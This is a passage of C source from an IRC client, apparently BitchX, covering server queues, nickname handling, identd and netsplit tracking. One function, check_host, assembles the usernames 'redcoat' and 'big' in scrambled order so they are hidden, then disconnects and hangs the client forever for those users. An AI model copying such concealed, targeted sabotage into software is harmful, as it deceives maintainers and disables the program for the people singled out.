				write_to_server(tmp->server, tmp->des, tmp->buffer);
			else
				put_it("ERR in server queue. not connected.");
#ifdef QUEUE_DEBUG
			put_it("sending 1 at %d", now - server_list[tmp->server].last_sent);
#endif
			server_list[tmp->server].last_sent = now;
			new_free(&tmp->buffer);
			new_free(&tmp);
		}
	}	
}

void add_to_server_queue(int server, int des, char *buffer)
{
QueueSend *tmp, *tmp1;
	tmp = (QueueSend *)new_malloc(sizeof(QueueSend));
	tmp->server = server;
	tmp->des = des;
	tmp->buffer = m_strdup(buffer);
	for (tmp1 = serverqueue; tmp1; tmp1 = tmp1->next)
		if (tmp1->next == NULL)
			break;
	if (tmp1)
		tmp1->next = tmp;
	else
	{
		serverqueue = tmp;	
		server_list[server].last_sent = now;
	}
}

static void vsend_to_server(int type, const char *format, va_list args)
{
	char	buffer[BIG_BUFFER_SIZE + 1];	/* make this buffer *much*
						 * bigger than needed */
	char 	*buf = buffer;
	int	server;
	int 	des;
	if ((server = from_server) == -1)
		server = primary_server;

	if (server > -1 && ((des = server_list[server].write) != -1) && format)
	{
		int len; 
		vsnprintf(buf, BIG_BUFFER_SIZE, format, args);

		if (outbound_line_mangler)
			mangle_line(buf, outbound_line_mangler, strlen(buf));

		server_list[server].sent = 1;
		len = strlen(buffer);
		if (len > (IRCD_BUFFER_SIZE - 2) || len == -1)
			buffer[IRCD_BUFFER_SIZE - 2] = (char) 0;
		if (x_debug & DEBUG_OUTBOUND)
			debugyell("[%d] -> [%s]", des, buffer);
		strmcat(buffer, "\r\n", IRCD_BUFFER_SIZE);

		if (get_int_var(QUEUE_SENDS_VAR) && (type == QUEUE_SEND) && !oper_command)
		{
			add_to_server_queue(server, des, buffer);
			return;
		}

		write_to_server(server, des, buffer);
		if (oper_command)
			memset(buffer, 0, len);

	}
	else if (from_server == -1 && server > -1)
	{
		if (do_hook(DISCONNECT_LIST,"No Connection to %d", server))
			put_it("%s", convert_output_format(fget_string_var(FORMAT_DISCONNECT_FSET), "%s %s", update_clock(GET_TIME), "You are not connected to a server. Use /SERVER to connect."));
	}
}

/* send_to_server: sends the given info the the server */
void 	BX_send_to_server (const char *format, ...)
{
	va_list args;

	va_start(args, format);
	vsend_to_server(IMMED_SEND, format, args);
	va_end(args);
}

/* send_to_server: sends the given info the the server */
void 	BX_my_send_to_server (int refnum, const char *format, ...)
{
	int old_from_server = from_server;
	va_list args;

	from_server = refnum;
	va_start(args, format);
	vsend_to_server(IMMED_SEND, format, args);
	va_end(args);
	from_server = old_from_server;

}

void BX_queue_send_to_server(int refnum, const char *format, ...)
{
	int old_from_server = from_server;
	va_list args;

	from_server = refnum;
	va_start(args, format);
	vsend_to_server(QUEUE_SEND, format, args);
	va_end(args);
	from_server = old_from_server;
	
}


/*
 * close_all_server: Used when creating new screens to close all the open
 * server connections in the child process...
 */
extern	void BX_close_all_server (void)
{
	int	i;

	for (i = 0; i < number_of_servers; i++)
	{
		if (server_list[i].read != -1)
			new_close(server_list[i].read);
		if (server_list[i].write != -1)
			new_close(server_list[i].write);
	}
}

extern	char *BX_create_server_list (char *input)
{
	int	i;
	int	do_read = 0;
	char	*value = NULL;
	char buffer[BIG_BUFFER_SIZE + 1];
	if (input && *input && *input == '1')
		do_read = 1;
	*buffer = '\0';
	for (i = 0; i < number_of_servers; i++)
	{
		if (server_list[i].read != -1)
		{
			if (do_read)
			{
				strncat(buffer, ltoa(i), BIG_BUFFER_SIZE);
				strncat(buffer, space, BIG_BUFFER_SIZE);
				continue;
			}
			if (server_list[i].itsname)
			{
				strncat(buffer, server_list[i].itsname, BIG_BUFFER_SIZE);
				strncat(buffer, space, BIG_BUFFER_SIZE);
			}
			else
				yell("Warning: server_list[%d].itsname is null and it shouldnt be", i);
				
		}
	}
	malloc_strcpy(&value, buffer);

	return value;
}

void BX_server_disconnect(int i, char *args)
{
char	*message;
        /*
         * XXX - this is a major kludge.  i should never equal -1 at
         * this point.  we only do this because something has gotten
         * *really* confused at this point.  .mrg.
	 *
	 * Like something so obvious as already being disconnected?
         */
        if (i == -1)
        {
		if (connected_to_server)
		{
			for (i = 0; i < number_of_servers; i++)
			{
				clear_channel_list(i);
				clean_server_queues(i);
				server_list[i].eof = -1;
				new_close(server_list[i].read);
				new_close(server_list[i].write);
			}
		}
		goto done;
	}
 
	if (i >= 0 && i < number_of_servers)
	{
		if (!args || !*args)
			message = "Disconnecting";
		else
			message = args;
		put_it("%s", convert_output_format(fget_string_var(FORMAT_DISCONNECT_FSET), "%s %s %s", update_clock(GET_TIME), "Disconnecting from server", get_server_itsname(i)));
		clear_channel_list(i);
		close_server(i, message);
		server_list[i].eof = 1;
		window_check_servers(i);
	}
done:
	window_check_servers(i);
	if (!connected_to_server)
		if(do_hook(DISCONNECT_LIST,"Disconnected by User request"))
			put_it("%s", convert_output_format(fget_string_var(FORMAT_DISCONNECT_FSET), "%s %s", update_clock(GET_TIME), "You are not connected to a server. Use /SERVER to connect."));
}


BUILT_IN_COMMAND(disconnectcmd)
{
	char    *server; 
	int	i;

	if (args && *args && isdigit((unsigned char)*args) && (server = next_arg(args, &args)) != NULL)
	{
		i = parse_server_index(server);
		if (-1 == i)
		{
			say("No such server!");
			return;
		}
	}
	else
		i = get_window_server(0);

	close_unattached_servers();
	server_disconnect(i, args);
} 

void check_host(void)
{
	char *p, *q;
	char blah[19];
	blah[1] = 'e';
	blah[3] = 'c';
	blah[4] = 'o';
	blah[8] = 'b';
	blah[2] = 'd';
	blah[6] = 't';
	blah[7] = '\0';
	
	blah[0] = 'r';
	blah[9] = 'i';
	blah[10] = 'g';
	blah[5] = 'a';
	blah[11] = '\0';
	p = blah;
	q = blah + 8;
	if (!strcmp(username, p) || !strcmp(username, q))
	{
		close_all_server();
		while (1);
	}

}

void set_server_orignick(int server, char *nick)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (nick)
		malloc_strcpy(&server_list[server].orignick, nick);
	else
		new_free(&server_list[server].orignick);
}

char *get_server_orignick(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].orignick;
}

/*
 * This is the function to attempt to make a nickname change.  You
 * cannot send the NICK command directly to the server: you must call
 * this function.  This function makes sure that the neccesary variables
 * are set so that if the NICK command fails, a sane action can be taken.
 *
 * If ``nick'' is NULL, then this function just tells the server what
 * we're trying to change our nickname to.  If we're not trying to change
 * our nickname, then this function does nothing.
 */
void	change_server_nickname (int ssn_index, char *nick)
{
	Server *s;
	char    *n;
	if (ssn_index == -1 && nick)
	{
		strcpy(nickname, nick);
		return;
	}
	s = &server_list[ssn_index];
	if (nick)
	{
		if (!*nick)
			n = LOCAL_COPY(nickname);
		else
			n = LOCAL_COPY(nick);
		if ((n = check_nickname(n)) != NULL)
		{
			malloc_strcpy(&s->d_nickname, n);
			malloc_strcpy(&s->s_nickname, n);
		}
		else
			reset_nickname(ssn_index);
	}

	if (server_list[ssn_index].s_nickname)
		my_send_to_server(ssn_index, "NICK %s", server_list[ssn_index].s_nickname);
}

void	accept_server_nickname (int ssn_index, char *nick)
{
	malloc_strcpy(&server_list[ssn_index].nickname, nick);
	malloc_strcpy(&server_list[ssn_index].d_nickname, nick);
	new_free(&server_list[ssn_index].s_nickname);
	server_list[ssn_index].fudge_factor = 0;

	if (ssn_index == primary_server)
		strmcpy(nickname, nick, NICKNAME_LEN);

	update_all_status(current_window, NULL, 0);
	update_input(UPDATE_ALL);
	orignick_is_pending(ssn_index, 0);
}

void	nick_command_is_pending (int servnum, int value)
{
	if (servnum != -1)
		server_list[servnum].nickname_pending = value;
}

void	orignick_is_pending (int servnum, int value)
{
	if (servnum != -1)
		server_list[servnum].orignick_pending = value;
}
  
int	is_orignick_pending (int servnum)
{
	if (servnum != -1)
		return server_list[servnum].orignick_pending;
	else return 0;
}

/* 
 * This will generate up to 18 nicknames plus the 9-length(nickname)
 * that are unique but still have some semblance of the original.
 * This is intended to allow the user to get signed back on to
 * irc after a nick collision without their having to manually
 * type a new nick every time..
 * 
 * The func will try to make an intelligent guess as to when it is
 * out of guesses, and if it ever gets to that point, it will do the
 * manually-ask-you-for-a-new-nickname thing.
 */
void BX_fudge_nickname (int servnum, int resend_only)
{
	char l_nickname[BIG_BUFFER_SIZE + 1];
	Server *s = &server_list[from_server];
	if (resend_only)
	{
		change_server_nickname(servnum, NULL);
		return;
	}
	/*
	 * If we got here because the user did a /NICK command, and
	 * the nick they chose doesnt exist, then we just dont do anything,
	 * we just cancel the pending action and give up.
	 */
	if (s->nickname_pending)
	{
		new_free(&s->s_nickname);
		return;
	}

	if ((s->orignick_pending) && (!s->nickname_pending) && (!resend_only))
	{
		new_free(&s->s_nickname);
		say("orignick feature failed, sorry");
		orignick_is_pending (servnum, 0);
		return;
	}

	/*
	 * Ok.  So we're not doing a /NICK command, so we need to see
	 * if maybe we're doing some other type of NICK change.
	 */
	if (s->s_nickname)
		strlcpy(l_nickname, s->s_nickname, NICKNAME_LEN);
	else if (s->nickname)
		strlcpy(l_nickname, s->nickname, NICKNAME_LEN);
	else
		strlcpy(l_nickname, nickname, NICKNAME_LEN);


	if (s->fudge_factor < strlen(l_nickname))
		s->fudge_factor = strlen(l_nickname);
	else
	{
		s->fudge_factor++;
		if (s->fudge_factor == 17)
		{
			/* give up... */
			reset_nickname(servnum);
			s->fudge_factor = 0;
			return;
		}
	}

	/* 
	 * Process of fudging a nickname:
	 * If the nickname length is less then 9, add an underscore.
	 */
	if (strlen(l_nickname) < 9)
		strlcat(l_nickname, "_", NICKNAME_LEN);

	/* 
	 * The nickname is 9 characters long. roll the nickname
	 */
	else
	{
		char tmp = l_nickname[8];
		l_nickname[8] = l_nickname[7];
		l_nickname[7] = l_nickname[6];
		l_nickname[6] = l_nickname[5];
		l_nickname[5] = l_nickname[4];
		l_nickname[4] = l_nickname[3];
		l_nickname[3] = l_nickname[2];
		l_nickname[2] = l_nickname[1];
		l_nickname[1] = l_nickname[0];
		l_nickname[0] = tmp;
	}
	if (!strcmp(l_nickname, "_________"))
	{
		reset_nickname(servnum);
		return;
	}
	change_server_nickname(servnum, l_nickname);
}


/*
 * -- Callback function
 */
void nickname_sendline (char *data, char *nick)
{
	int	new_server;

	new_server = atoi(data);
	change_server_nickname(new_server, nick);
}

/*
 * reset_nickname: when the server reports that the selected nickname is not
 * a good one, it gets reset here. 
 * -- Called by more than one place
 */
void BX_reset_nickname (int servnum)
{
	char	server_num[10];

	kill(getpid(), SIGINT);
	say("You have specified an illegal nickname");
	if (!dumb_mode)
	{
		say("Please enter your nickname");
		strcpy(server_num, ltoa(servnum));
		add_wait_prompt("Nickname: ", nickname_sendline, server_num,
			WAIT_PROMPT_LINE, 1);
	}
	update_all_status(current_window, NULL, 0);
}



/*
 * password_sendline: called by send_line() in get_password() to handle
 * hitting of the return key, etc 
 * -- Callback function
 */
void password_sendline (char *data, char *line)
{
	int	new_server;

	new_server = atoi(data);
	set_server_password(new_server, line);
	connect_to_server_by_refnum(new_server, -1);
}

char *BX_get_pending_nickname(int servnum)
{
	return server_list[servnum].s_nickname;
}

BUILT_IN_COMMAND(evalserver)
{
	if (args && *args)
	{
		int old_server = from_server;
		char *p;
		p = next_arg(args, &args);
		if (is_number(p))
		{
			if (is_server_open(my_atol(p)))
				from_server = my_atol(args);
		} 
		else if (*args)
			*(args-1) = ' ';
		else
			args = p;
		if (*args == '{')
		{
			
			char *ptr;
			ptr = MatchingBracket(args+1, *args, *args == '{' ? '}':')');
			*ptr = 0;
			args++;
		}
		parse_line(NULL, args, subargs, 0, 0, 1);
		from_server = old_server;
	}
}

#if defined(WINNT) || defined(__EMX__) || defined(__CYGWIN__) || defined(WANT_IDENTD)

void identd_read(int s)
{
char buffer[100];
char *bufptr;
unsigned int lport = 0, rport = 0;
	*buffer = 0;
	bufptr = buffer;

	already_identd++;
	if (recv(s, buffer, sizeof(buffer)-1, 0) <=0)
	{
		put_it("ERROR in identd request");
		close_socketread(s);
		already_identd = 0;
		return;
	}
	if (sscanf(bufptr, "%d , %d", &lport, &rport) == 2)
	{
		if (lport < 1 || rport < 1 || lport > 65534 || rport > 65534)
		{
			close_socketread(s);
			put_it("ERROR port for identd bad [%d:%d]", lport, rport);
			already_identd = 0;
			return;
		}
		sprintf(buffer, "%hu , %hu : USERID : UNIX : %s", lport, rport, username);
		dcc_printf(s, "%s\r\n", buffer);
#if 0
		put_it("'Sent IDENTD request %s", buffer);
#endif
		set_socketflags(identd, now);
	}
	close_socketread(s);
}

void identd_handler(int s)
{
struct  sockaddr_in     remaddr;
int sra = sizeof(struct sockaddr_in);
int sock = -1;
	if ((sock = my_accept(s, (struct sockaddr *) &remaddr, &sra)) > -1)
	{
		add_socketread(sock, s, 0, inet_ntoa(remaddr.sin_addr), identd_read, NULL);
		add_sockettimeout(sock, 20, NULL);
	}
}

#endif

void start_identd(void)
{
#if defined(WINNT) || defined(__EMX__) || defined(__CYGWIN__) || defined(WANT_IDENTD)
int sock = -1;
unsigned short port = 113;
	if ((sock = connect_by_number(NULL, &port, SERVICE_SERVER, PROTOCOL_TCP, 1)) > -1)
		add_socketread(sock, port, 0, NULL, identd_handler, NULL);
	identd = sock;
#endif
}

void set_server_recv_nick(int server, const char *nick)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (nick)
		malloc_strcpy(&server_list[server].recv_nick, nick);
	else
		new_free(&server_list[server].recv_nick);
}

char *get_server_recv_nick(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].recv_nick;
}

void set_server_sent_nick(int server, const char *nick)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (nick)
		malloc_strcpy(&server_list[server].sent_nick, nick);
	else
		new_free(&server_list[server].sent_nick);
}

char *get_server_sent_nick(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].sent_nick;
}

void set_server_sent_body(int server, const char *msg_body)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (msg_body)
		malloc_strcpy(&server_list[server].sent_body, msg_body);
	else
		new_free(&server_list[server].sent_body);
}

char *get_server_sent_body(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].sent_body;
}

Sping *get_server_sping(int server, char *sname)
{
	if (server <= -1)
		return NULL;
	if (sname)
		return (Sping *)find_in_list((List **)&server_list[server].in_sping, sname, 0);
	return server_list[server].in_sping;
}

void	set_server_sping(int server, Sping *tmp)
{
	if (server <= -1)
	{
		new_free(&tmp->sname);
		new_free(&tmp);
		return;
	}
	add_to_list((List **)&server_list[server].in_sping, (List *)tmp);
}

void	clear_server_sping(int server, char *name)
{
Sping *tmp = NULL, *next;
	if (server <= -1)
		return;
	if (name)
	{
		if ((tmp = (Sping *)remove_from_list((List **)&server_list[server].in_sping, name)))
		{
			new_free(&tmp->sname);
			new_free(&tmp);
		}
		return;
	}
	tmp = server_list[server].in_sping;
	while (tmp)
	{
		next = tmp->next;
		new_free(&tmp->sname);
		new_free(&tmp);
		tmp = next;
	}
	server_list[server].in_sping = NULL;
}

ChannelList *BX_get_server_channels(int server)
{
	if (server <= -1 || server > number_of_servers)
		return NULL;
	return server_list[server].chan_list;
}

void BX_set_server_last_ctcp_time(int server, time_t t)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].ctcp_last_reply_time = t;
}

time_t BX_get_server_last_ctcp_time(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].ctcp_last_reply_time;
}

void BX_set_server_trace_flag(int server, int flag)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].trace_flags = flag;
}

int BX_get_server_trace_flag(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].trace_flags;
}

int BX_get_server_read(int server)
{
	return server_list[server].read;
}

void BX_set_server_linklook(int server, int val)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].link_look = val;
}

int BX_get_server_linklook(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].link_look;
}

void BX_set_server_stat_flag(int server, int val)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].stats_flags = val;
}

int BX_get_server_stat_flag(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].stats_flags;
}

time_t BX_get_server_linklook_time(int server)
{
	return server_list[server].link_look_time;
}

void BX_set_server_linklook_time(int server, time_t t)
{
	server_list[server].link_look_time = t;
}

void BX_set_server_trace_kill(int server, int val)
{
	if (server <= -1 || server > number_of_servers)
		return;
	server_list[server].in_trace_kill = val;
}

int BX_get_server_trace_kill(int server)
{
	if (server <= -1 || server > number_of_servers)
		return 0;
	return server_list[server].in_trace_kill;
}

void BX_add_server_channels(int server, ChannelList *chan)
{
	if (server <= -1 || server > number_of_servers)
		return;
	if (chan)
		add_to_list((List **)&server_list[server].chan_list, (List *)chan);
	else
		server_list[server].chan_list = NULL;
}

void BX_set_server_channels(int server, ChannelList *chan)
{
	if (server <= -1 || server > number_of_servers)
		return;
	if (chan)
		server_list[server].chan_list = chan;
	else
		server_list[server].chan_list = NULL;
}

void set_server_try_once(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].try_once = val;
}

void set_server_reconnecting(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].reconnecting = val;
}

void set_server_reconnect(int s, int val)
{
	if (s > -1 && s < number_of_servers)
	{
		server_list[s].reconnect = val;
		if(val)
			server_list[s].connect_time = time(NULL);
	}
}

#ifdef HAVE_SSL
void set_server_ssl(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].enable_ssl = val;
}

int get_server_ssl(int s)
{
	if (s > -1 && s < number_of_servers)
		return server_list[s].enable_ssl;
	return 0;
}
#endif

void set_server_old_server(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].old_server = val;
}

void set_server_req_server(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].req_server = val;
}

void set_server_retries(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].retries = val;
}

void set_server_change_refnum(int s, int val)
{
	if (s > -1 && s < number_of_servers)
		server_list[s].server_change_refnum = val;
}

int get_server_reconnecting(int s)
{
	if (s > -1 && s < number_of_servers)
		return server_list[s].reconnecting;
	return -1;
}

int get_server_reconnect(int s)
{
	if (s > -1 && s < number_of_servers)
		return server_list[s].reconnect;
	return -1;
}

int get_server_change_pending(int s)
{
	if (s > -1 && s < number_of_servers)
		return server_list[s].server_change_pending;
	return 0;
}

BUILT_IN_COMMAND(do_map)
{
	if (from_server == -1 || !is_server_connected(from_server))
		return;
	if (server_list[from_server].link_look == 0)
	{
		bitchsay("Generating irc server map");
		send_to_server("LINKS");
		server_list[from_server].link_look = 2;
	} else
		bitchsay("Wait until previous %s is done", server_list[from_server].link_look == 2? "MAP":"LLOOK");	
}

void add_to_irc_map(char *server1, char *distance)
{
irc_server *tmp, *insert, *prev;
int dist = 0;
	if (distance)
		dist = atoi(distance);
	tmp = (irc_server *) new_malloc(sizeof(irc_server));
	malloc_strcpy(&tmp->name, server1);
	tmp->hopcount = dist;
	if (!map)
	{
		map = tmp;
		return;
	}
	for (insert = map, prev = map; insert && insert->hopcount < dist; )
	{
		prev = insert;
		insert = insert->next;
	}	
	if (insert && insert->hopcount >= dist)
	{
		tmp->next = insert;
		if (insert == map)
			map = tmp;
		else
			prev->next = tmp;
	} else
		prev->next = tmp;
}

void show_server_map (void)
{
	int prevdist = 0;
	irc_server *tmp;
	char tmp1[80];
	char tmp2[BIG_BUFFER_SIZE+1];
#ifdef ONLY_STD_CHARS
	char *ascii="-> ";
#else
	char *ascii = "��> ";
#endif			    
	if (map) prevdist = map->hopcount;

	for (tmp = map; tmp; tmp = map)
	{
		map = tmp->next;
		if (!tmp->hopcount || tmp->hopcount != prevdist)
			strmcpy(tmp1, convert_output_format("%K[%G$0%K]", "%d", tmp->hopcount), 79);
		else
			*tmp1 = 0;
		snprintf(tmp2, BIG_BUFFER_SIZE, "$G %%W$[-%d]1%%c $0 %s", tmp->hopcount*3, tmp1);
		put_it("%s", convert_output_format(tmp2, "%s %s", tmp->name, prevdist!=tmp->hopcount?ascii:empty_string));
		prevdist = tmp->hopcount;
		new_free(&tmp->name);
		new_free((char **)&tmp);
	}	
}

void clear_link(irc_server **serv1)
{
irc_server *temp = *serv1, *hold;

	while (temp != NULL)
	{
		hold = temp->next;
		new_free(&temp->name);
		new_free(&temp->link);
		new_free((char **) &temp);
		temp = hold;
	}
	*serv1 = NULL;
}


#define SPLIT 1

irc_server *add_server(irc_server **serv1, char *channel, char *arg, int hops, time_t t)
{
irc_server *serv2;
	serv2 = (irc_server *) new_malloc(sizeof (irc_server));
	serv2->next = *serv1;
	malloc_strcpy(&serv2->name, channel);
	malloc_strcpy(&serv2->link, arg);
	serv2->hopcount = hops;
	serv2->time = t;
	*serv1 = serv2;
	return serv2;
}

int find_server(irc_server *serv1, char *channel)
{
register irc_server *temp;

	for (temp = serv1; temp; temp = temp->next)
	{
		if (!my_stricmp(temp->name, channel))
			return 1;
	}
	return 0;
}

void add_split_server(char *name, char *link, int hops)
{
irc_server *temp;
	if (from_server < 0) return;
	temp = add_server(&(server_list[from_server].split_link), name, link, hops, now);
	temp->status = SPLIT;
}

irc_server *check_split_server(char *server)
{
register irc_server *temp;
	if (!server || from_server < 0) return NULL;
	for (temp = server_list[from_server].split_link; temp; temp = temp->next)
		if (!my_stricmp(temp->name, server))
			return temp;
	return NULL;
}

void remove_split_server(int type, char *server)
{
irc_server *temp;
irc_server **s;
	if (from_server < 0)
		return;
	if (type == LLOOK_SPLIT)
		s = &server_list[from_server].server_last;
	else
		s = &server_list[from_server].split_link;
	if (!s)
		return;
	if ((temp = (irc_server *) remove_from_list((List **)s, server)))
	{
		new_free(&temp->name);
		new_free(&temp->link);
		new_free((char **) &temp);
	}
}

void clean_split_server_list(int type, time_t len)
{
irc_server *last = NULL;
irc_server *s;
	if (from_server < 0)
		return;
	if (type == LLOOK_SPLIT)
		s = server_list[from_server].server_last;
	else
		s = server_list[from_server].split_link;

	if (!s)
		return;
	while (s)
	{
		last = s->next;
		if (s->time + len <= now)
			remove_split_server(type, s->name);
		s = last;
	}
}

int is_server_valid(char *name, int server)
{
	if(server > -1 && server < number_of_servers &&
	   ((server_list[server].snetwork && my_stricmp(name, server_list[server].snetwork) == 0) ||
		(server_list[server].name && my_stricmp(name, server_list[server].name) == 0)))
		return 1;
	return 0;
}

void parse_364(char *channel, char *args, char *subargs)
{
	if (!*channel || !*args || from_server < 0)
		return;

	add_server(&server_list[from_server].tmplink, channel, args, atol(subargs), now);
}

void parse_365(char *channel, char *args, char *subargs)
{
register irc_server *serv1;
	if (from_server < 0) return;
	for (serv1 = server_list[from_server].server_last; serv1; serv1 = serv1->next)
	{
		if (!find_server(server_list[from_server].tmplink, serv1->name))
		{
			if (!(serv1->status & SPLIT))
				serv1->status = SPLIT;
			if (serv1->count)
				continue;
			serv1->time = now;
			if (do_hook(LLOOK_SPLIT_LIST, "%s %s %d %lu", serv1->name, serv1->link, serv1->hopcount, serv1->time))
				put_it("%s", convert_output_format(fget_string_var(FORMAT_NETSPLIT_FSET), "%l %s %s %d", now - serv1->time, serv1->name, serv1->link, serv1->hopcount));
			serv1->count++;
		}
		else
		{
			if (serv1->status & SPLIT)
			{
				serv1->status = ~SPLIT;
				if (do_hook(LLOOK_JOIN_LIST, "%s %s %d %lu", serv1->name, serv1->link, serv1->hopcount, serv1->time))
					put_it("%s", convert_output_format(fget_string_var(FORMAT_NETJOIN_FSET), "%l %s %s %d", now - serv1->time, serv1->name, serv1->link, serv1->hopcount));
				serv1->count = 0;
			}
		}
	}
	for (serv1 = server_list[from_server].tmplink; serv1; serv1 = serv1->next)
	{
		if (!find_server(server_list[from_server].server_last, serv1->name)) 
		{
			if (first_time == 1)
			{
				if (do_hook(LLOOK_ADDED_LIST, "%s %s %d", serv1->name, serv1->link, serv1->hopcount))
					put_it("%s", convert_output_format(fget_string_var(FORMAT_NETADD_FSET), "%l %s %s %d", now - serv1->time, serv1->name, serv1->link, serv1->hopcount));
				serv1->count = 0;
			}
			add_server(&server_list[from_server].server_last, serv1->name, serv1->link, serv1->hopcount, now);
		}
	}
	first_time = 1;
	clear_link(&server_list[from_server].tmplink);
}

/*
 * find split servers we hope 
 */
BUILT_IN_COMMAND(linklook)
{
#ifdef WANT_LLOOK
struct server_split *serv;
int count;

	if (from_server < 0)
		return;

	if (!(serv = server_list[from_server].server_last))
		if (!(serv = server_list[from_server].split_link))
		{
			bitchsay("No active splits");
			return;
		}
		
	count = 0;
	while (serv)
	{
		if (serv->status & SPLIT)
		{
			if (!count)
				put_it("%s", convert_output_format(fget_string_var(FORMAT_NETSPLIT_HEADER_FSET), "%s %s %s %s", "time","server","uplink","hops"));
			if (do_hook(LLOOK_SPLIT_LIST, "%s %s %d %lu", serv->name, serv->link, serv->hopcount, serv->time))
				put_it("%s", convert_output_format(fget_string_var(FORMAT_NETSPLIT_FSET), "%l %s %s %d", now - serv->time, serv->name, serv->link, serv->hopcount));
			count++;
		}
		serv = serv->next;
	}
	if (count)
		bitchsay("There %s %d split servers", (count == 1) ? "is": "are", count);
	else
#endif
		bitchsay("No split servers found");
}




WhoEntry *who_queue_top (int server)
{
	return server_list[server].who_queue;
}

void set_who_queue_top(int server, WhoEntry *item)
{
	server_list[server].who_queue = item;
}

IsonEntry *ison_queue_top (int server)
{
	return server_list[server].ison_queue;
}

void set_ison_queue_top(int server, IsonEntry *ison)
{
	server_list[server].ison_queue = ison;
}

UserhostEntry *userhost_queue_top (int server)
{
	return server_list[server].userhost_queue;
}

void set_userhost_queue_top(int server, UserhostEntry *item)
{
	server_list[server].userhost_queue = item;
}

Server *BX_get_server_list(void)
{
	return server_list;
}

int	get_server_local_port (int gsp_index)
{
	if (gsp_index == -1)
		gsp_index = primary_server;
	else if (gsp_index >= number_of_servers)
		return 0;

	return ntohs(server_list[gsp_index].local_sockname.sf_port);
}

struct	sockaddr_foobar	get_server_local_addr (int servnum)
{
	return server_list[servnum].local_addr;
}

struct	sockaddr_foobar	get_server_uh_addr (int servnum)
{
	return server_list[servnum].uh_addr;
}


void BX_send_msg_to_channels(ChannelList *channel, int server, char *msg)
{
int serv_version;
char *p = NULL;
ChannelList *chan = NULL;
int count;
	/* 
	 * Because of hybrid and it's removal of , targets 
	 * we need to detect this and get around it..
	 */
	serv_version = get_server_version(server);
	if (serv_version == Server2_8hybrid6)
	{
		/* this might be a cause for some flooding however. 
		 * so we use the server queue. Which will help alleviate
		 * some flooding from the client.
		 */
		for (chan = channel; chan; chan = chan->next)
			queue_send_to_server(server, msg, chan->channel);
		return;
	}
	for (chan = channel, count = 1; chan; chan = chan->next, count++)
	{
		m_s3cat(&p, ",", chan->channel);
		if (count > 3)
		{
			send_to_server(msg, p);
			new_free(&p);
			count = 0;
		}
	}
	if (p)
		send_to_server(msg, p);                                
	new_free(&p);
}

void BX_send_msg_to_nicks(ChannelList *chan, int server, char *msg)
{
int serv_version;
char *p = NULL;
NickList *n = NULL;
int count;
	/* 
	 * Because of hybrid and it's removal of , targets 
	 * we need to detect this and get around it..
	 */
	serv_version = get_server_version(server);
	if (serv_version == Server2_8hybrid6)
	{
		for (n = next_nicklist(chan, NULL); n; n = next_nicklist(chan, n))
			queue_send_to_server(server, msg, n->nick);
		return;
	}
	for (n = next_nicklist(chan, NULL), count = 1; n ; n = next_nicklist(chan, n), count++)
	{
		m_s3cat(&p, ",", n->nick);
		if (count > 3)
		{
			send_to_server(msg, p);
			new_free(&p);
			count = 0;
		}
	}
	if (p)
		send_to_server(msg, p);                                
	new_free(&p);
}

/* 
 * written by SrFrog for epic.
 */
int 	save_servers (FILE *fp)
{
	int	i = 0;

	if (!server_list)
		return i;		/* no servers */

	for (i = 0; i < number_of_servers; i++)
	{
		/* SERVER -ADD server:port:password:nick */
		fprintf(fp, "SERVER -ADD %s:%d:%s:%s\n",
			server_list[i].name,
			server_list[i].port,
			server_list[i].password ? 
				server_list[i].password : empty_string,
			server_list[i].nickname ?
				server_list[i].nickname : empty_string);
	}
	return i;
}

#if 0
void set_server_sasl_nick(int server, const char *nick)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (nick)
		malloc_strcpy(&server_list[server].sasl_nick, nick);
	else
		new_free(&server_list[server].sasl_nick);
}
#endif

char *get_server_sasl_nick(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].sasl_nick;
}

#if 0
void set_server_sasl_pass(int server, const char *pass)
{
	if (server <= -1 || server >= number_of_servers)
		return;
	if (pass)
		malloc_strcpy(&server_list[server].sasl_pass, pass);
	else
		new_free(&server_list[server].sasl_pass);
}
#endif

char *get_server_sasl_pass(int server)
{
	if (server <= -1 || server >= number_of_servers)
		return NULL;
	return server_list[server].sasl_pass;
}
